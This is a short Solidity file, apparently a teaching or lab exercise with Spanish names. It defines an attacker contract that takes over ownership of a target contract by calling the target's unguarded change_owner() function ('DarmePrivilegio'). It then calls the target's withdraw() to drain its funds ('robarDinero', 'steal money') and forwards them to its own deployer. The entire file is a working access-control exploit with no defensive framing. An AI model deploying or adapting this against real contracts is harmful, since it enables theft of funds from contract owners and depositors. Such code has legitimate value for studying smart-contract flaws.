//SPDX-License-Identifier:MIT
pragma solidity >=0.7.0 <0.9.0;

interface alice {
    function withdraw() external;
}


contract bob{
    
    address public owner;

    modifier onlyOwner() {
        require(msg.sender==owner,"no eres el owner");
        _;
    }

    constructor() {
        owner=msg.sender;
    }    

    function DarmePrivilegio(address _alice) external{
        (bool success, ) = _alice.call( abi.encodeWithSignature("change_owner()") );
        require(success==true, "el call no funciono");
    }

    function robarDinero(address _alice) external{
        alice contrato= alice(_alice);
        contrato.withdraw();
    }

    function withdraw() external onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}

}